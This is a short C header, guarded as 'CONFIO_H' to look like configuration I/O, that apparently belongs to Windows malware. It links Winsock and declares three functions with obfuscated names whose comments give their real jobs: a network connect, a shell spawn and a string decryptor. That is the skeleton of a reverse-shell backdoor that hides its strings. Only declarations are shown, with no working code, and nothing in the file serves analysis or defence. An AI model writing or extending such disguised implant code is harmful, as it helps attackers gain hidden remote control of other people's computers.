#ifndef CONFIO_H
#define CONFIO_H

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

void* s9e1();            // net connect
int q7k3(void*);         // spawn shell
char* u0l8(char*, char); // string decryptor

#endif
#endif
